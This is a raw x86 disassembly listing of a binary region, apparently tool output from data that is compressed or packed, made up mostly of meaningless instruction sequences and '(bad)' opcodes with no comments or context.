  42181b:	mov    ah,0xd2
  42181d:	lahf   
  42181e:	daa    
  42181f:	dec    ebx
  421820:	xchg   ebp,eax
  421821:	test   BYTE PTR [edx+0x3b51a625],bh
  421827:	jmp    0x51c1aa89
  42182c:	xchg   BYTE PTR [eax+0x46cef24a],dh
  421832:	or     ah,BYTE PTR [esi]
  421834:	or     DWORD PTR [ebx+0x7490d2eb],ebp
  42183a:	inc    ebp
  42183b:	mov    bh,0xd8
  42183d:	shr    edi,0xd7
  421840:	add    eax,0x1961b953
  421845:	hlt    
  421846:	sub    BYTE PTR [esi-0x3],bh
  421849:	rol    ah,cl
  42184b:	cmp    dh,bl
  42184d:	stc    
  42184e:	sub    cl,al
  421850:	mov    DWORD PTR [edx-0x17dc049a],ecx
  421856:	ja     0x4218d1
  421858:	fcomp  DWORD PTR [esi+0x34]
  42185b:	test   al,0xc9
  42185d:	retf   
  42185e:	sub    edi,esi
  421860:	ds push esi
  421862:	(bad)  
  421864:	aam    0x3
  421866:	or     BYTE PTR [esi],cl
  421868:	dec    edi
  421869:	sbb    bl,0xd8
  42186c:	jmp    0xbbb3d2f9
  421871:	stc    
  421872:	sahf   
  421873:	mov    ds:0xaec71841,eax
  421878:	or     eax,0xb8aec8e8
  42187d:	inc    esi
  42187e:	and    BYTE PTR [edx+0x45b55080],al
  421884:	sub    BYTE PTR [edi+ebx*4-0x1c],al
  421888:	push   esi
  421889:	fcmovne st,st(7)
  42188b:	pop    edx
  42188c:	cmc    
  42188d:	sbb    BYTE PTR [eax-0xf6ebda2],cl
  421893:	jmp    0xbd68:0xfa6b04a3
  42189a:	lea    eax,[esi+0x7b4bc64b]
  4218a0:	sub    DWORD PTR ds:[esi-0x6d],ebp
  4218a4:	fcom   st(4)
  4218a6:	test   esi,edx
  4218a8:	fwait
  4218a9:	lahf   
  4218aa:	rcl    DWORD PTR [ebp+ecx*2+0x74],cl
  4218ae:	inc    ebx
  4218af:	jo     0x4218b4
  4218b1:	sar    DWORD PTR ds:0x5461934d,1
  4218b7:	ret    
  4218b8:	push   ebx
  4218b9:	ret    
  4218ba:	das    
  4218bb:	cmp    eax,0xcfde16d7
  4218c0:	mov    fs,WORD PTR [ecx-0x80]
  4218c3:	lock jp 0x42185b
  4218c6:	xlat   BYTE PTR ds:[ebx]
  4218c7:	adc    bh,bh
  4218c9:	out    dx,eax
	...
  421a9e:	mov    esi,0xc2004247
  421aa3:	inc    edi
  421aa4:	inc    edx
  421aa5:	add    dh,al
  421aa7:	inc    edi
  421aa8:	inc    edx
  421aa9:	add    dl,cl
  421aab:	inc    edi
  421aac:	inc    edx
  421aad:	add    dh,cl
  421aaf:	inc    edi
  421ab0:	inc    edx
  421ab1:	add    dl,dl
  421ab3:	inc    edi
  421ab4:	inc    edx
  421ab5:	add    dh,dl
  421ab7:	inc    edi
  421ab8:	inc    edx
  421ab9:	add    dl,bl
  421abb:	inc    edi
  421abc:	inc    edx
  421abd:	add    BYTE PTR [ebp-0x29],dl
  421ac0:	mov    edx,0x7defba87
  421ac5:	xlat   BYTE PTR ds:[ebx]
  421ac6:	lea    esp,[esi+edx*4+0x6a]
  421aca:	sub    ecx,edx
  421acc:	pushf  
  421acd:	loop   0x421b1c
  421acf:	or     al,0x1
  421ad1:	add    BYTE PTR [edx],ah
  421ad3:	pop    es
  421ad4:	add    BYTE PTR [eax],al
  421ad6:	add    BYTE PTR [edx],bh
  421ad8:	sbb    esp,DWORD PTR [ebx-0x79c33cfd]
  421ade:	mov    edx,0x24d688be
  421ae3:	test   eax,0x9f1f7255
  421ae8:	(bad)  [ebp+0x2f]
  421aeb:	pushf  
  421aec:	popf   
  421aed:	xor    BYTE PTR [edx+edi*2+0x4696bf14],dh
  421af4:	(bad)  
  421af6:	sahf   
  421af7:	sbb    dh,BYTE PTR [ebp-0x7b]
  421afa:	inc    edi
  421afb:	call   0x5531285d
  421b00:	adc    dh,bh
  421b02:	add    eax,0x6ea620df
  421b07:	jl     0x421aff
  421b09:	mov    edx,0xf2ae36f1
  421b0e:	inc    esp
  421b0f:	daa    
  421b10:	out    dx,al
  421b11:	mov    ecx,0xd576abdf
  421b16:	add    eax,0xbd4f4823
  421b1b:	test   DWORD PTR [edi-0x27],eax
  421b1e:	das    
  421b1f:	jns    0x421b95
  421b21:	dec    ebp
  421b22:	mov    ch,0xc6
  421b24:	sar    BYTE PTR [ebx],cl
  421b26:	clc    
  421b27:	lods   eax,DWORD PTR ds:[esi]
  421b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b29:	add    eax,esi
  421b2b:	push   edx
  421b2c:	push   cs
  421b2d:	in     al,dx
  421b2e:	dec    ebx
  421b2f:	cs inc esp
  421b31:	xchg   ebx,eax
  421b32:	aas    
  421b33:	(bad)  
  421b34:	xchg   esp,eax
  421b35:	fisttp DWORD PTR [eax+0x4b]
  421b38:	cmc    
  421b39:	call   0x5c3cd357
  421b3e:	popf   
  421b3f:	js     0x421ba7
  421b41:	mov    bl,0x69
  421b43:	mov    DWORD PTR [edi+0x44],edi
  421b46:	les    ebx,FWORD PTR [eax+0x3d]
  421b49:	cmc    
  421b4a:	outs   dx,DWORD PTR ds:[esi]
  421b4b:	adc    eax,0x80cb05fc
  421b50:	xchg   edx,eax
  421b51:	mul    DWORD PTR [edx+0x9]
  421b54:	xchg   edx,eax
  421b55:	push   ds
  421b56:	in     eax,0xe5
  421b58:	lods   al,BYTE PTR ds:[esi]
  421b59:	rcr    DWORD PTR [ebp-0x60],cl
  421b5c:	adc    al,0xfd
  421b5e:	mov    dl,BYTE PTR [esi-0x3]
  421b61:	mov    ch,0x25
  421b63:	sub    eax,0xe88cbfa5
  421b68:	xchg   DWORD PTR [ecx+0x21],ebx
  421b6b:	cmp    eax,0x46e79300
  421b70:	fdivr  st,st(6)
  421b72:	js     0x421b07
  421b74:	(bad)  
  421b76:	jl     0x421b23
  421b78:	mov    al,ds:0x67d9915e
  421b7d:	pop    esp
  421b7e:	out    dx,al
  421b7f:	aaa    
  421b80:	push   cs
  421b81:	xchg   BYTE PTR [esi+0xbeee192],ch
  421b87:	mov    ebx,0x41c4556a
  421b8c:	leave  
  421b8d:	add    BYTE PTR [ebp+0x6a],0x5c
  421b91:	add    eax,0x9013f51a
  421b96:	mov    ebx,0xc97ba878
  421b9b:	lock adc BYTE PTR [edx*8-0x4bc6e460],0xce
  421ba4:	fcmovnb st,st(4)
  421ba6:	mov    ch,0x72
  421ba8:	aaa    
  421ba9:	pop    ebx
  421baa:	loope  0x421b93
  421bac:	dec    esp
  421bad:	popa   
  421bae:	or     al,0x40
  421bb0:	mov    ecx,0xd17f3838
  421bb5:	stos   DWORD PTR es:[edi],eax
  421bb6:	adc    al,0x64
  421bb8:	xchg   ecx,eax
  421bb9:	repnz rol DWORD PTR [edx+0x1465e429],0xe8
  421bc1:	inc    edx
  421bc2:	mov    DWORD PTR [ecx+0x718205c8],eax
  421bc8:	cs iret 
  421bca:	jmp    0xaa30:0xc8c6a53c
  421bd1:	inc    esi
  421bd2:	ret    
  421bd3:	lods   eax,DWORD PTR ds:[esi]
  421bd4:	inc    edi
  421bd5:	or     cl,dl
  421bd7:	sub    dh,BYTE PTR [esi]
  421bd9:	dec    eax
  421bda:	jecxz  0x421bcd
  421bdc:	in     eax,0xa
  421bde:	mov    eax,ds:0xa5547419
  421be3:	jmp    0x421bf9
  421be5:	sahf   
  421be6:	pop    sp
  421be8:	mov    DWORD PTR [edx+0x63],ebp
  421beb:	cli    
  421bec:	adc    al,0x69
  421bee:	adc    eax,0xbcdc2123
  421bf3:	out    dx,eax
  421bf4:	aaa    
  421bf5:	sub    eax,0xc5bdb6ac
  421bfa:	aad    0x49
  421bfc:	daa    
  421bfd:	leave  
  421bfe:	imul   edx,DWORD PTR ds:0xe4dc9004,0x2bdafa33
  421c08:	jle    0x421b9e
  421c0a:	daa    
  421c0b:	adc    DWORD PTR [eax+eax*1-0x5a],eax
  421c0f:	adc    eax,0x21ba6f2f
  421c14:	push   esp
  421c15:	jle    0x421bec
  421c17:	push   esi
  421c18:	inc    esi
  421c19:	in     al,0xcf
  421c1b:	jg     0x421be5
  421c1d:	pushf  
  421c1e:	mov    ebp,0x366a388a
  421c23:	cmc    
  421c24:	xor    BYTE PTR [edi],cl
  421c26:	and    al,0x36
  421c28:	inc    ebp
  421c29:	mov    ch,BYTE PTR [eax-0x403a4eb1]
  421c2f:	sub    eax,0xf84ca744
  421c34:	or     eax,esi
  421c36:	in     eax,dx
  421c37:	pop    ebx
  421c38:	cmp    eax,0x3c4e22e2
  421c3d:	or     DWORD PTR [edi],edx
  421c3f:	out    dx,al
  421c40:	xchg   ebp,eax
  421c41:	bound  ecx,QWORD PTR [esp+eax*8-0x30]
  421c45:	add    ebp,DWORD PTR [eax+0x30]
  421c48:	xchg   ecx,esp
  421c4a:	mov    dh,0xfc
  421c4c:	int3   
  421c4d:	inc    edi
  421c4e:	push   cs
  421c4f:	in     eax,0xc
  421c51:	pop    ss
  421c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c53:	or     bl,al
  421c55:	(bad)  
  421c56:	mov    esp,0xeca04bf6
  421c5b:	cdq    
  421c5c:	jb     0x421be6
  421c5e:	add    DWORD PTR [edx],0xb5f8ec2b
  421c64:	pop    esi
  421c65:	sbb    al,0xe
  421c67:	mov    al,0x76
  421c69:	imul   ebx,DWORD PTR [ecx+0x4],0xffffffa0
  421c6d:	pushf  
  421c6e:	pop    esp
  421c6f:	sbb    DWORD PTR [esi-0x4099b361],esi
  421c75:	adc    BYTE PTR [esi],al
  421c77:	push   ds
  421c78:	mov    esp,0x413a479c
  421c7d:	jb     0x421c50
  421c7f:	cmp    DWORD PTR [edi],esi
  421c81:	or     eax,0x54be19df
  421c86:	pop    ds
  421c87:	pop    ebp
  421c88:	(bad)  [esi+0x61]
  421c8b:	lea    esi,[edi]
  421c8d:	cmp    al,0xff
  421c8f:	aaa    
  421c90:	inc    esi
  421c91:	mov    bh,BYTE PTR [edx-0x76]
  421c94:	xchg   esp,eax
  421c95:	cmp    ch,BYTE PTR [ecx+0x5b]
  421c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c99:	(bad)  
  421c9a:	push   esp
  421c9b:	out    dx,al
  421c9c:	stos   BYTE PTR es:[edi],al
  421c9d:	inc    esp
  421c9e:	hlt    
  421c9f:	sub    ebp,DWORD PTR [eax+0xe51a772]
  421ca5:	mov    dh,0x3a
  421ca7:	loope  0x421caa
  421ca9:	aaa    
  421caa:	enter  0x77d5,0x1
  421cae:	jmp    0x421c8f
  421cb0:	push   esp
  421cb1:	mov    esp,DWORD PTR [ecx+0xa]
  421cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cb5:	aam    0xa8
  421cb7:	sbb    al,0xf9
  421cb9:	pushf  
  421cba:	fistp  WORD PTR [ebx]
  421cbc:	and    al,0xc6
  421cbe:	mov    dh,0xf9
  421cc0:	sbb    BYTE PTR [edi+eiz*4+0x15fb256e],ch
  421cc7:	xchg   DWORD PTR [ecx-0x80],edx
  421cca:	xlat   BYTE PTR ds:[ebx]
  421ccb:	cmp    esp,DWORD PTR [esi+0x16]
  421cce:	jbe    0x421d0f
  421cd0:	shl    DWORD PTR [ebp-0x2a0790ac],0x14
  421cd7:	pop    edi
  421cd8:	aam    0x42
  421cda:	ja     0x421c8c
  421cdc:	or     al,0xb1
  421cde:	in     al,dx
  421cdf:	or     al,0x1b
  421ce1:	icebp  
  421ce2:	xor    BYTE PTR [ecx-0x7ec46dfe],cl
  421ce8:	lahf   
  421ce9:	pop    edx
  421cea:	inc    edx
  421ceb:	out    dx,eax
  421cec:	call   0x8803:0xdcdeb4ce
  421cf3:	mov    ebp,0x4c076885
  421cf8:	das    
  421cf9:	fdiv   DWORD PTR [ebx]
  421cfb:	dec    edi
  421cfc:	mov    ecx,0x39564986
  421d01:	ss daa 
  421d03:	popf   
  421d04:	call   0xe3ff447d
  421d09:	daa    
  421d0a:	and    ebx,DWORD PTR [ebx]
  421d0c:	loopne 0x421d42
  421d0e:	push   ebx
  421d0f:	das    
  421d10:	(bad)  
  421d11:	ret    
  421d12:	aam    0xf8
  421d14:	xor    DWORD PTR [eax+0x1a7b3d90],eax
  421d1a:	mov    esp,0x8e6752f7
  421d1f:	icebp  
  421d20:	mov    WORD PTR [edi+0x79aa2902],gs
  421d26:	ins    BYTE PTR es:[edi],dx
  421d27:	scas   eax,DWORD PTR es:[edi]
  421d28:	push   ebx
  421d29:	sub    cl,BYTE PTR [esi-0x1feb652a]
  421d2f:	imul   DWORD PTR [edi+0x72]
  421d32:	jo     0x421d14
  421d34:	adc    DWORD PTR [eax+0x64d77cb3],ebx
  421d3a:	fisub  DWORD PTR [bx+di-0x2943]
  421d3f:	div    DWORD PTR [ebx]
  421d41:	shl    BYTE PTR [esi-0x3f],0x40
  421d45:	dec    ebx
  421d46:	pop    esp
  421d47:	aas    
  421d48:	pop    eax
  421d49:	in     eax,0xfa
  421d4b:	retf   0x52b2
  421d4e:	ja     0x421d1e
  421d50:	jne    0x421cf6
  421d52:	sbb    eax,0xdde69883
  421d57:	adc    BYTE PTR [ecx+esi*1],bl
  421d5a:	(bad)  
  421d5c:	out    0xde,eax
  421d5e:	xor    edx,DWORD PTR [esp+ebp*1-0x1]
  421d62:	imul   ebx,DWORD PTR [ebp+0x402a85a9],0x6a
  421d69:	or     eax,DWORD PTR [ecx-0x45]
  421d6c:	hlt    
  421d6d:	lock push edx
  421d6f:	retf   
  421d70:	add    DWORD PTR [edi],esi
  421d72:	jae    0x421d6b
  421d74:	(bad)  
  421d75:	adc    edx,esi
  421d77:	outs   dx,DWORD PTR ds:[esi]
  421d78:	add    dl,BYTE PTR [esi+0x181e9701]
  421d7e:	mov    ecx,?
  421d80:	neg    esp
  421d82:	add    al,0xd3
  421d84:	push   edx
  421d85:	frstor [edx]
  421d87:	push   edi
  421d88:	fild   QWORD PTR ds:0xaacf05d9
  421d8e:	cmove  eax,DWORD PTR ds:0x3cebe611
  421d95:	push   eax
  421d96:	aam    0xf
  421d98:	sub    ah,BYTE PTR [ebp+0x52]
  421d9b:	adc    dl,dh
  421d9d:	sbb    eax,0x5069817e
  421da2:	xchg   ecx,eax
  421da3:	or     BYTE PTR [ebx-0x66],0x91
  421da7:	sbb    eax,0xf133322d
  421dac:	pop    ds
  421dad:	mov    esi,0xe9886e1f
  421db2:	sbb    BYTE PTR [ebp+0x5c],cl
  421db5:	push   eax
  421db6:	dec    edi
  421db7:	push   ecx
  421db8:	push   edi
  421db9:	jbe    0x421e12
  421dbb:	neg    DWORD PTR [ebp+0x3e469309]
  421dc1:	push   eax
  421dc2:	ja     0x421e05
  421dc4:	(bad)  
  421dc5:	jge    0x421d76
  421dc7:	adc    al,0x85
  421dc9:	and    bh,cl
  421dcb:	adc    eax,0xe82c95dc
  421dd0:	mov    eax,esi
  421dd2:	pop    eax
  421dd3:	push   eax
  421dd4:	dec    edx
  421dd5:	mov    bh,0xba
  421dd7:	into   
  421dd8:	pop    edi
  421dd9:	mov    BYTE PTR [ebx],ch
  421ddb:	cmp    BYTE PTR [edi-0x6c],dl
  421dde:	mov    ecx,0x49c54658
  421de3:	idiv   bl
  421de5:	pop    esp
  421de6:	add    al,0xb9
  421de8:	or     ch,ch
  421dea:	xchg   esi,eax
  421deb:	jns    0x421d90
  421ded:	ds pop ebp
  421def:	push   eax
  421df0:	adc    DWORD PTR [ebp-0x715015fe],ebx
  421df6:	push   cs
  421df7:	dec    esi
  421df8:	pop    ebp
  421df9:	pop    eax
  421dfa:	cmp    eax,0xfed962a5
  421dff:	pop    ebp
  421e00:	or     DWORD PTR [ebp-0x46],edx
  421e03:	jae    0x421e4f
  421e05:	adc    DWORD PTR [ebp+0x59],edi
  421e08:	mov    dl,0x85
  421e0a:	or     edi,ecx
  421e0c:	dec    edx
  421e0d:	jmp    0x421d9f
  421e0f:	imul   edx,DWORD PTR [ecx-0x4c26e873],0xea85c5e0
  421e19:	std    
  421e1a:	call   0xcf20d723
  421e1f:	adc    eax,DWORD PTR [eax]
  421e21:	dec    ebp
  421e22:	jbe    0x421dae
  421e24:	mov    ds:0xbf3e8e0f,al
  421e29:	mov    ah,0xcf
  421e2b:	push   0x57
  421e2d:	pop    ecx
  421e2e:	inc    ecx
  421e2f:	test   DWORD PTR [esi+0x2],edx
  421e32:	push   ds
  421e33:	sbb    BYTE PTR [edi-0x39071de0],0xc
  421e3a:	(bad)  
  421e3c:	sbb    esi,DWORD PTR [ebx]
  421e3e:	lock xlat BYTE PTR ds:[ebx]
  421e40:	add    eax,0x10bbe922
  421e45:	pop    esi
  421e46:	inc    eax
  421e47:	outs   dx,DWORD PTR ds:[esi]
  421e48:	inc    esi
  421e49:	dec    esp
  421e4a:	cmp    BYTE PTR [ecx+esi*4],ah
  421e4d:	stos   DWORD PTR es:[edi],eax
  421e4e:	sub    DWORD PTR [edx-0x632e5957],eax
  421e54:	sub    ebx,DWORD PTR [eax+0x468c6f65]
  421e5a:	add    al,0xd9
  421e5c:	cli    
  421e5d:	mov    esi,0x3231ec08
  421e62:	loopne 0x421e99
  421e64:	retf   0x7f8d
  421e67:	inc    edi
  421e68:	adc    BYTE PTR [edi],ah
  421e6a:	fisttp DWORD PTR [ecx+0x7700239e]
  421e70:	pop    eax
  421e71:	mov    al,ds:0x824e4e39
  421e76:	addr16 aaa 
  421e78:	cmp    dl,cl
  421e7a:	(bad)  
  421e7b:	enter  0xe41a,0xc6
  421e7f:	aad    0x87
  421e81:	sub    esp,DWORD PTR [edx]
  421e83:	iret   
  421e84:	test   DWORD PTR [edi+eax*8+0x74],esi
  421e88:	and    ah,0xf0
  421e8b:	push   ebx
  421e8c:	ja     0x421e5c
  421e8e:	or     eax,0x63112cab
  421e93:	(bad)  
  421e95:	ds cmp al,0xce
  421e98:	(bad)  
  421e99:	pop    ebx
  421e9a:	shl    edx,0xb7
  421e9d:	jnp    0x421ee2
  421e9f:	ja     0x421e91
  421ea1:	mov    esp,DWORD PTR [esi-0x7ab8876c]
  421ea7:	dec    ebp
  421ea8:	or     al,0x21
  421eaa:	dec    ebp
  421eab:	or     bh,BYTE PTR [edx+0x5411524b]
  421eb1:	fisttp DWORD PTR [edx+ecx*1-0x6]
  421eb5:	fimul  DWORD PTR [ebp-0x31]
  421eb8:	loope  0x421e4c
  421eba:	push   0xcb5a5f42
  421ebf:	xor    al,0xd1
  421ec1:	fldcw  WORD PTR [edi-0x7e7d8012]
  421ec7:	mov    ah,0x57
  421ec9:	pop    ecx
  421eca:	fs mov esi,0x14677874
  421ed0:	aas    
  421ed1:	ds in  al,0xd4
  421ed4:	into   
  421ed5:	sub    al,0x4
  421ed7:	sbb    edi,edi
  421ed9:	add    DWORD PTR [esi+ebx*8],ecx
  421edc:	pop    ebp
  421edd:	mov    BYTE PTR [edi-0x4756bbb3],al
  421ee3:	icebp  
  421ee4:	test   cl,0x3b
  421ee7:	and    eax,DWORD PTR [edi+0x5e529d34]
  421eed:	xchg   esp,eax
  421eee:	hlt    
  421eef:	hlt    
  421ef0:	rol    bl,cl
  421ef2:	out    0x57,al
  421ef4:	xchg   ebp,ebp
  421ef6:	xchg   esp,eax
  421ef7:	or     al,0x6e
  421ef9:	add    bl,BYTE PTR [esi+0x12928a3]
  421eff:	adc    esi,DWORD PTR [ebx]
  421f01:	lea    ebx,[esi-0x681a80b0]
  421f07:	xchg   ebx,eax
  421f08:	pop    ss
  421f09:	arpl   WORD PTR [ebp+0x2683c135],ax
  421f0f:	pop    DWORD PTR [edx+0x71]
  421f12:	pop    ss
  421f13:	aaa    
  421f14:	stos   DWORD PTR es:[edi],eax
  421f15:	popa   
  421f16:	mov    ecx,esp
  421f18:	or     DWORD PTR [edi-0x34979d73],0x16aa4a9
  421f22:	inc    eax
  421f23:	out    dx,al
  421f24:	and    esi,DWORD PTR [ebp+eiz*2-0x346cd736]
  421f2b:	sub    esp,esp
  421f2d:	icebp  
  421f2e:	jno    0x421f27
  421f30:	jae    0x421f94
  421f32:	adc    BYTE PTR [ebp+0x417a04b6],bl
  421f38:	inc    ecx
  421f39:	and    BYTE PTR [esi+0x25],dh
  421f3c:	lods   al,BYTE PTR ds:[esi]
  421f3d:	aaa    
  421f3e:	add    cl,cl
  421f40:	xor    al,0x60
  421f42:	push   ebx
  421f43:	(bad)  
  421f44:	mov    ah,0x89
  421f46:	je     0x421f7c
  421f48:	sbb    ah,BYTE PTR [ebp+0xc691efb]
  421f4e:	ror    DWORD PTR [ebp-0x70530de5],0x2
  421f55:	add    ch,BYTE PTR [edx]
  421f57:	inc    ebp
  421f58:	out    0xa8,al
  421f5a:	rcr    BYTE PTR [ebx-0x27ac2e3d],1
  421f60:	pand   mm0,mm7
  421f63:	and    al,0xbe
  421f65:	mov    WORD PTR [ebx],gs
  421f67:	ror    DWORD PTR [ebx+eiz*2+0x3e7ad6bd],cl
  421f6e:	sub    BYTE PTR [edx],dl
  421f70:	push   esp
  421f71:	mov    ecx,0xc197cd6e
  421f76:	addr16 cli 
  421f78:	mov    fs,WORD PTR [ecx+0x480b2d9e]
  421f7e:	scas   eax,DWORD PTR es:[edi]
  421f7f:	jmp    0xbca4e5ab
  421f84:	clc    
  421f85:	popf   
  421f86:	inc    ecx
  421f87:	mov    bl,0xa6
  421f89:	sahf   
  421f8a:	sub    edx,esp
  421f8c:	mov    bl,bl
  421f8e:	fimul  DWORD PTR [edi-0x3a]
  421f91:	(bad)  
  421f92:	mov    ah,dh
  421f94:	fdivrp st(5),st
  421f96:	mov    eax,ss:0x4c072210
  421f9c:	jg     0x421fbe
  421f9e:	cmp    dh,dl
  421fa0:	cli    
  421fa1:	in     al,0x7f
  421fa3:	push   eax
  421fa4:	mov    BYTE PTR [ebx+edx*4-0x17215451],0x31
  421fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fad:	inc    esp
  421fae:	cmp    BYTE PTR [edi],0xcd
  421fb1:	outs   dx,DWORD PTR ds:[esi]
  421fb2:	repz push cs
  421fb4:	dec    ecx
  421fb5:	and    eax,0xc95b6f16
  421fba:	inc    eax
  421fbb:	aas    
  421fbc:	mov    esi,DWORD PTR [ebp+0x39ba89e0]
  421fc2:	sar    DWORD PTR [ecx],1
  421fc4:	ins    BYTE PTR es:[edi],dx
  421fc5:	fisubr WORD PTR [edx+0x4]
  421fc8:	idiv   BYTE PTR [edx+0x13559d2f]
  421fce:	(bad)  
  421fcf:	mov    ?,eax
  421fd1:	sbb    edx,edi
  421fd3:	icebp  
  421fd4:	xchg   ebp,eax
  421fd5:	sbb    esi,edi
  421fd7:	loopne 0x421fce
  421fd9:	mov    bh,0x8d
  421fdb:	or     al,BYTE PTR [ebp+0x5963e69d]
  421fe1:	test   dh,ah
  421fe3:	scas   al,BYTE PTR es:[edi]
  421fe4:	push   0x6e
  421fe6:	adc    al,BYTE PTR [edx+0x439a766b]
  421fec:	or     DWORD PTR [edx+esi*8],eax
  421fef:	or     ch,ch
  421ff1:	neg    esp
  421ff3:	push   ebp
  421ff4:	mov    DWORD PTR [ebp+0x24],esi
  421ff7:	out    0x64,al
  421ff9:	pop    esi
  421ffa:	std    
  421ffb:	push   edx
  421ffc:	jb     0x421f82
  421ffe:	ret    
  421fff:	(bad)  
  422000:	mov    esp,0x589b68c2
  422005:	leave  
  422006:	add    ecx,edx
  422008:	in     eax,dx
  422009:	and    BYTE PTR [esi+0x4e],dh
  42200c:	retf   
  42200d:	add    DWORD PTR [eax],ebp
  42200f:	call   0xbaaf:0x1773f64b
  422016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422017:	inc    ecx
  422018:	jbe    0x422066
  42201a:	dec    ecx
  42201b:	xchg   esi,eax
  42201c:	test   eax,0x5b3c5101
  422021:	test   al,0x0
  422023:	mov    edi,0xa2cfad9d
  422028:	popa   
  422029:	imul   ebx,DWORD PTR [esi],0x5a
  42202c:	adc    DWORD PTR [edx-0x1937b25d],0xcd028d83
  422036:	or     cl,BYTE PTR [edx]
  422038:	mov    WORD PTR [ebx+0x257cb089],fs
  42203e:	push   0x7e
  422040:	jb     0x42200b
  422042:	pop    ss
  422043:	mov    ebp,0xfc0a09f8
  422048:	xchg   ebx,eax
  422049:	test   BYTE PTR [ebx],dh
  42204b:	call   FWORD PTR [ebp-0x3a]
  42204e:	jge    0x421fe7
  422050:	mov    dh,0x1
  422052:	push   ecx
  422053:	pop    ds
  422054:	(bad)  
  422056:	xchg   ebx,esi
  422058:	pusha  
  422059:	mov    ecx,0xffbf2c14
  42205e:	jle    0x42209b
  422060:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  422062:	cmp    dh,ah
  422064:	inc    edx
  422065:	pop    esp
  422066:	fidiv  DWORD PTR gs:[esi]
  422069:	dec    edi
  42206a:	xchg   dh,ch
  42206c:	pusha  
  42206d:	and    eax,0xe3d06a14
  422072:	(bad)  
  422073:	sbb    DWORD PTR [ecx-0x49],edx
  422076:	clc    
  422077:	ret    0x5617
  42207a:	das    
  42207b:	mov    esi,0x195a94a4
  422080:	dec    esp
  422081:	pop    esi
  422082:	ret    
  422083:	ins    DWORD PTR es:[edi],dx
  422084:	and    eax,0xce89894d
  422089:	aad    0xab
  42208b:	(bad)  
  42208d:	cmc    
  42208e:	mov    ecx,0x58fc825b
  422093:	mov    edx,esp
  422095:	xchg   DWORD PTR [esi+0x53],ebp
  422098:	mov    ds:0x5b5192f0,eax
  42209d:	xchg   BYTE PTR [ecx],dh
  42209f:	stos   DWORD PTR es:[edi],eax
  4220a0:	push   eax
  4220a1:	jns    0x42208e
  4220a3:	jle    0x4220be
  4220a5:	mov    al,0x48
  4220a7:	call   0xeb6a2d6b
  4220ac:	inc    ebp
  4220ad:	mov    ch,0xdd
  4220af:	call   0x6ba8674
  4220b4:	lea    edi,[esp+eiz*8]
  4220b7:	sbb    BYTE PTR [ebp+0x28],bh
  4220ba:	push   esp
  4220bb:	jns    0x422075
  4220bd:	loope  0x422122
  4220bf:	mov    cl,0xd3
  4220c1:	aam    0xfe
  4220c3:	xchg   edi,eax
  4220c4:	and    cl,BYTE PTR [ebx]
  4220c6:	fiadd  DWORD PTR [edi+0x141b02c1]
  4220cc:	inc    edi
  4220cd:	ret    0x5b93
  4220d0:	in     al,dx
  4220d1:	pushf  
  4220d2:	and    ebx,DWORD PTR [esi+0x39]
  4220d5:	inc    ebp
  4220d6:	jl     0x4220ed
  4220d8:	shl    al,1
  4220da:	push   edx
  4220db:	cmp    al,ah
  4220dd:	pusha  
  4220de:	mov    ds:0x948ba966,al
  4220e3:	mov    dl,0x27
  4220e5:	aaa    
  4220e6:	mov    edi,0xc91164ab
  4220eb:	adc    DWORD PTR ds:0xb8303521,edx
  4220f1:	add    eax,0x26c00f66
  4220f6:	cwde   
  4220f7:	mov    dl,0x3a
  4220f9:	sub    eax,0xf55002e1
  4220fe:	out    dx,al
  4220ff:	int3   
  422100:	inc    ebp
  422101:	dec    edx
  422102:	mov    eax,esi
  422104:	xor    bh,cl
  422106:	pop    ss
  422107:	mov    bh,0x3f
  422109:	es cdq 
  42210b:	std    
  42210c:	pop    eax
  42210d:	push   ebp
  42210e:	xchg   BYTE PTR [ebx-0x4d8aa18e],al
  422114:	or     ch,BYTE PTR [eax+esi*2-0x36]
  422118:	pop    esi
  422119:	sub    BYTE PTR [edi+0x52c49def],0x32
  422120:	xchg   ecx,eax
  422121:	add    al,0x3b
  422123:	jae    0x422133
  422125:	xor    BYTE PTR [ebp*1-0xf436ec4],dl
  42212c:	and    al,0x9b
  42212e:	hlt    
  42212f:	mov    dl,0xa9
  422131:	pop    esp
  422132:	test   BYTE PTR es:[ebp-0x6cd05473],ah
  422139:	cmp    al,0xd2
  42213b:	(bad)  
  42213c:	dec    ebx
  42213d:	aad    0x43
  42213f:	jp     0x422118
  422141:	or     BYTE PTR [edi],bh
  422143:	fadd   DWORD PTR [ecx+0x52]
  422146:	xchg   esi,eax
  422147:	inc    esp
  422148:	mov    ecx,0xb4694d71
  42214d:	jo     0x4221a2
  42214f:	jo     0x422174
  422151:	xor    edx,edx
  422153:	loop   0x4221c5
  422155:	mov    eax,0xe2cb6ddc
  42215a:	daa    
  42215b:	stos   DWORD PTR es:[edi],eax
  42215c:	into   
  42215d:	test   eax,esp
  42215f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422160:	inc    edi
  422161:	outs   dx,BYTE PTR ds:[esi]
  422162:	gs mov edi,0x2146baa
  422168:	ret    0x529a
  42216b:	loop   0x422178
  42216d:	mov    dh,0x46
  42216f:	xchg   edx,eax
  422170:	pop    esi
  422171:	ret    0x69de
  422174:	xor    DWORD PTR [esi+esi*1],0x60bc35b1
  42217b:	mov    esi,DWORD PTR fs:[edi-0xa1c22fc]
  422182:	push   es
  422183:	push   0xc4177418
  422188:	aaa    
  422189:	bound  edi,QWORD PTR [edx-0x11]
  42218c:	leave  
  42218d:	cdq    
  42218e:	jge    0x42211a
  422190:	pop    eax
  422191:	in     al,dx
  422192:	into   
  422193:	inc    ecx
  422194:	push   cs
  422195:	add    DWORD PTR [edx],ecx
  422197:	mov    esi,0x145066d5
  42219c:	jno    0x422176
  42219e:	jg     0x422150
  4221a0:	out    0x20,eax
  4221a2:	jmp    0xb8697a1a
  4221a7:	or     ah,dl
  4221a9:	pop    edi
  4221aa:	icebp  
  4221ab:	shl    ah,1
  4221ad:	mov    ecx,es
  4221af:	or     edx,DWORD PTR [edi-0x48c2530b]
  4221b5:	and    DWORD PTR [edi-0x20],esi
  4221b8:	mov    ebx,0x16f6b67e
  4221bd:	cli    
  4221be:	sti    
  4221bf:	test   eax,0x4a307785
  4221c4:	mov    ebp,0xb91297b1
